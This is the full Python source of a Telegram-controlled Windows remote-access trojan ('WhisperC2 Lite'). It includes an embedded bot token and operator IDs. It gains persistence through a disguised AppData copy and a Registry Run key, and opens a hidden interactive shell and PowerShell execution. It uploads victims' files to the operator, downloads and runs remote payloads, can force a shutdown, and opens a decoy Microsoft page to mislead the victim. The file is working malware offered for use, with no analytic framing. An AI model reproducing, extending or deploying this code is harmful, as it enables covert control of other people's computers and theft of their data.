#!/usr/bin/env python3
# =============================================================================
# WhisperC2 Lite – FINAL VERIFIED BUILD (Zero Oversights)
# =============================================================================
import telebot, platform, subprocess, threading, time, os, sys, io, traceback, webbrowser, locale
import shutil, winreg, ctypes, requests
from datetime import datetime
from pathlib import Path
from urllib.parse import urlparse
import random, string

# -----------------------------------------------------------------------------
# Configuration – your exact Telegram details
# -----------------------------------------------------------------------------
BOT_API_KEY = "8318891177:AAG8SB7YI_YAQHL2cszd4fKFK8Xp9-7u-JY"
OPERATOR_CHAT_ID = 5178265082
GROUP_CHAT_ID = -1003972714956
DECOY_URL = "https://learn.microsoft.com/en-us/dynamics365/supply-chain/procurement/purchase-order-overview"

# -----------------------------------------------------------------------------
# Single‑instance mutex (no duplicates)
# -----------------------------------------------------------------------------
MUTEX_NAME = "Global\\WhisperLite_Mutex"
mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
if ctypes.windll.kernel32.GetLastError() == 183:           # ERROR_ALREADY_EXISTS
    sys.exit(0)

# -----------------------------------------------------------------------------
# Runtime log buffer (sent as Execution_log.txt before decoy)
# -----------------------------------------------------------------------------
log_lines = []

def log(msg: str) -> None:
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_lines.append(f"[{timestamp}] {msg}")
    print(f"* {msg}")

def send_log_to_telegram(bot_instance) -> None:
    if not log_lines:
        return
    try:
        log_text = "\n".join(log_lines)
        bio = io.BytesIO(log_text.encode('utf-8'))
        bio.name = "Execution_log.txt"
        bio.seek(0)
        bot_instance.send_document(OPERATOR_CHAT_ID, bio)
        log("Log delivered")
    except Exception as e:
        print(f"Failed to send log: {e}")

bot = telebot.TeleBot(BOT_API_KEY)

# -----------------------------------------------------------------------------
# Agent identification & writable persistence directory
# -----------------------------------------------------------------------------
appdata = os.environ.get('APPDATA', os.path.expanduser('~'))
agents_dir = os.path.join(appdata, 'Microsoft', 'Windows')
os.makedirs(agents_dir, exist_ok=True)

def get_system_id() -> str:
    hostname = subprocess.getstatusoutput("hostname")[1].strip().upper()
    raw_user = subprocess.getstatusoutput("whoami")[1].strip()
    if '\\' in raw_user:
        username = raw_user.split('\\', 1)[1]
    else:
        username = raw_user
    return f"{hostname}/{username}"

SYSTEM_ID = get_system_id()

# -----------------------------------------------------------------------------
# Persistence – copies EXE to AppData & sets Registry Run key
# -----------------------------------------------------------------------------
def install_persistence() -> bool:
    if not getattr(sys, 'frozen', False):
        log("Persistence skipped – script mode")
        return False
    try:
        dest_path = Path(agents_dir) / 'SystemSettingsBroker.exe'
        current = Path(sys.executable if getattr(sys, 'frozen', False) else __file__)
        if current.resolve() == dest_path.resolve():
            return True
        if not dest_path.exists():
            try:
                shutil.copy2(current, dest_path)
            except PermissionError:
                log("Copy skipped – destination exists or is locked.")
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r'Software\Microsoft\Windows\CurrentVersion\Run',
                            0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, 'System Settings Broker', 0, winreg.REG_SZ, str(dest_path))
        return True
    except Exception as e:
        log(f"Persistence error: {traceback.format_exc()}")
        return False

def self_destruct() -> None:
    log("Self‑destruct started")
    try:
        persistent = Path(agents_dir) / 'SystemSettingsBroker.exe'
        if persistent.exists():
            persistent.unlink()
    except Exception:
        pass
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r'Software\Microsoft\Windows\CurrentVersion\Run',
                            0, winreg.KEY_SET_VALUE) as key:
            try:
                winreg.DeleteValue(key, 'System Settings Broker')
            except FileNotFoundError:
                pass
    except Exception:
        pass
    try:
        current = Path(sys.executable if getattr(sys, 'frozen', False) else __file__)
        if current.exists():
            MOVEFILE_DELAY_UNTIL_REBOOT = 0x4
            ctypes.windll.kernel32.MoveFileExW(str(current), None, MOVEFILE_DELAY_UNTIL_REBOOT)
    except Exception:
        pass

# -----------------------------------------------------------------------------
# Interactive shell (subprocess‑based, non‑blocking, fully invisible)
# -----------------------------------------------------------------------------
shell_active = False
shell_process = None

def spawn_shell() -> bool:
    global shell_active, shell_process
    if shell_active:
        return True
    try:
        shell_process = subprocess.Popen(
            "cmd.exe",
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=0,
            creationflags=0x08000000          # CREATE_NO_WINDOW
        )
        shell_active = True
        threading.Thread(target=shell_reader, daemon=True).start()
        return True
    except Exception as e:
        log(f"Shell spawn error: {e}")
        return False

def shell_reader() -> None:
    while shell_active and shell_process and shell_process.stdout:
        try:
            line = shell_process.stdout.readline()
            if not line:
                break
            safe = line.replace('```', "'''")
            for chunk in [safe[i:i+3900] for i in range(0, len(safe), 3900)]:
                bot.send_message(OPERATOR_CHAT_ID, f"```\n{chunk}\n```", parse_mode='Markdown')
        except:
            break
    kill_shell()

def kill_shell() -> None:
    global shell_active, shell_process
    shell_active = False
    try:
        if shell_process:
            shell_process.stdin.close()
            shell_process.terminate()
    except:
        pass

def write_shell(cmd: str) -> None:
    if shell_active and shell_process and shell_process.stdin:
        try:
            shell_process.stdin.write(cmd + "\n")
            shell_process.stdin.flush()
        except:
            kill_shell()

# -----------------------------------------------------------------------------
# System command execution
# -----------------------------------------------------------------------------
def sys_cmd(cmd: str) -> str:
    try:
        out = subprocess.getstatusoutput(cmd)[1]
        return out[:4000] if len(out) > 4000 else out
    except Exception as e:
        return f"Error: {e}"

def ps_cmd(cmd: str) -> str:
    try:
        out = subprocess.getstatusoutput(f"powershell -Command {cmd}")[1]
        return out[:4000] if len(out) > 4000 else out
    except Exception as e:
        return f"Error: {e}"

def view_file(path: str) -> str:
    try:
        if not os.path.exists(path):
            return "Not found"
        if os.path.isdir(path):
            return "Is a directory"
        if os.path.getsize(path) > 10*1024*1024:
            return "Too large"
        with open(path, 'r', errors='ignore') as f:
            content = f.read()[:4000]
        return content
    except Exception as e:
        return f"Error: {e}"

def download_file_fs(path: str):
    if not os.path.exists(path):
        return None, "Not found"
    if os.path.isdir(path):
        return None, "Is a directory"
    if os.path.getsize(path) > 50*1024*1024:
        return None, "Too large"
    return path, None

# -----------------------------------------------------------------------------
# DEX (download & execute) – robust, 30s timeout, reboot‑cleanup
# -----------------------------------------------------------------------------
def dex(url, *args):
    if not url:
        return "Usage: dex <url> [args...]"
    parsed = urlparse(url)
    if parsed.scheme not in ('http', 'https'):
        return "Invalid scheme"
    ext = os.path.splitext(parsed.path)[1] or ".exe"
    name = ''.join(random.choices(string.ascii_letters + string.digits, k=8)) + ext
    dest = os.path.join(os.environ.get('TEMP', os.environ.get('TMP', os.curdir)), name)

    try:
        r = requests.get(url, stream=True, timeout=30)
        r.raise_for_status()
        with open(dest, 'wb') as f:
            for chunk in r.iter_content(8192):
                if chunk:
                    f.write(chunk)
    except Exception as e:
        return f"Download failed: {e}"

    try:
        cmd_line = f'"{dest}"'
        if args:
            cmd_line += ' ' + ' '.join(args)
        proc = subprocess.Popen(cmd_line, shell=True,
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                text=True, creationflags=0x08000000)
        try:
            out, err = proc.communicate(timeout=30)
        except subprocess.TimeoutExpired:
            proc.kill()
            out, err = proc.communicate()
            return "Timed out after 30 seconds"

        output = (out.strip() + "\n" + err.strip()).strip() or "[No output]"
        return f"Executed: {dest}\nExit: {proc.returncode}\n{output}"
    except Exception as e:
        return f"Execution error: {e}"
    finally:
        try:
            MOVEFILE_DELAY_UNTIL_REBOOT = 0x4
            ctypes.windll.kernel32.MoveFileExW(dest, None, MOVEFILE_DELAY_UNTIL_REBOOT)
        except:
            pass

# -----------------------------------------------------------------------------
# Command dispatcher
# -----------------------------------------------------------------------------
def execute_command(cmd_line: str) -> tuple:
    parts = cmd_line.strip().split(' ', 1)
    cmd = parts[0].lower()
    args = parts[1] if len(parts) > 1 else ""

    if cmd in ("ping", "start", "scan"):
        return f"🟢 {SYSTEM_ID} online\n{platform.system()} {platform.release()}", None

    elif cmd == "shell":
        if args:
            return sys_cmd(args).replace('```', "'''"), None
        else:
            if spawn_shell():
                return "💬 Interactive shell started. Type `exit` to close.", None
            else:
                return "❌ Failed to spawn shell.", None

    elif cmd in ("powershell", "pow"):
        if not args:
            return "Usage: powershell <command>", None
        return ps_cmd(args).replace('```', "'''"), None

    elif cmd in ("download", "downloadfile"):
        path, err = download_file_fs(args.strip())
        if err:
            return err, None
        return f"⬆️ Uploading {args.strip()}", path

    elif cmd == "delete":
        try:
            os.remove(args.strip())
            return f"🗑️ Deleted: {args.strip()}", None
        except Exception as e:
            return f"❌ Delete failed: {e}", None

    elif cmd in ("view", "viewfile"):
        return view_file(args.strip()).replace('```', "'''"), None

    elif cmd == "dex":
        sp = args.find(' ')
        if sp == -1:
            url = args
            extra = ()
        else:
            url = args[:sp]
            extra = tuple(args[sp+1:].split())
        return dex(url, *extra).replace('```', "'''"), None

    elif cmd == "die":
        log("Die received")
        try:
            send_log_to_telegram(bot)
        except:
            pass
        self_destruct()
        return "💀 Shutting down...", None

    elif cmd == "off":
        try:
            subprocess.run(["shutdown", "/s", "/t", "0", "/f"], check=True)
        except Exception as e:
            return f"❌ Shutdown failed: {e}", None
        return "🔌 Shutting down PC...", None

    else:
        return f"❓ Unknown: {cmd}", None

# -----------------------------------------------------------------------------
# Telegram handler – case‑insensitive die, ignores bot messages
# -----------------------------------------------------------------------------
TOPIC_ID = None

def message_handler(message) -> None:
    if message.from_user.id != OPERATOR_CHAT_ID:
        return
    if message.from_user.is_bot:
        return
    if hasattr(message, 'message_thread_id') and message.message_thread_id is None:
        return

    text = message.text.strip()
    if not text:
        return

    # Interactive shell forwarding
    if shell_active:
        clean = text[1:] if text.startswith('/') else text
        if clean.lower() == "exit":
            kill_shell()
            reply_kwargs = {'message_thread_id': TOPIC_ID} if TOPIC_ID else {}
            bot.reply_to(message, "💬 Shell closed.", parse_mode='Markdown', **reply_kwargs)
        elif clean.lower().startswith("die"):
            kill_shell()
            execute_command("die")
        else:
            write_shell(clean)
        return

    # Normal command processing
    if text.startswith('/'):
        text = text[1:]

    response, file_path = execute_command(text)

    # Build reply kwargs (message_thread_id only if TOPIC_ID is set)
    reply_kwargs = {'message_thread_id': TOPIC_ID} if TOPIC_ID else {}

    # Case‑insensitive die exit
    if text.lower().startswith("die"):
        bot.reply_to(message, f"```\n{response}\n```", parse_mode='Markdown', **reply_kwargs)
        os._exit(0)

    # Send the response
    try:
        bot.reply_to(message, f"```\n{response}\n```", parse_mode='Markdown', **reply_kwargs)
    except:
        bot.reply_to(message, response, **reply_kwargs)

    # Send generated file (screenshot, webcam – none in this lit version, but kept for future)
    if file_path and os.path.exists(file_path):
        try:
            with open(file_path, 'rb') as f:
                send_kwargs = {'message_thread_id': TOPIC_ID} if TOPIC_ID else {}
                bot.send_document(message.chat.id, f, **send_kwargs)
        except Exception as e:
            log(f"File send error: {e}")
            bot.reply_to(message, f"Error: {e}", **reply_kwargs)
        finally:
            try:
                os.remove(file_path)
            except:
                pass

bot.message_handler(func=lambda msg: True)(message_handler)

# -----------------------------------------------------------------------------
# Main – sets up forum topic and enters polling
# -----------------------------------------------------------------------------
if __name__ == "__main__":
    log("Agent starting")

    if not install_persistence():
        log("Persistence failed – continuing")
    else:
        log("Persistence installed")

    log(f"Agent ID: {SYSTEM_ID}")

    try:
        new_topic = bot.create_forum_topic(GROUP_CHAT_ID, SYSTEM_ID, icon_color=0x6FB9F0)
        TOPIC_ID = new_topic.message_thread_id
        log(f"Topic #{TOPIC_ID} created")
    except Exception as e:
        log(f"Topic creation failed: {e}")

    send_log_to_telegram(bot)
    webbrowser.open(DECOY_URL)

    log("Polling…")
    while True:
        try:
            bot.polling(none_stop=True, timeout=30)
        except Exception as e:
            log(f"Polling error: {e}")
            time.sleep(10)
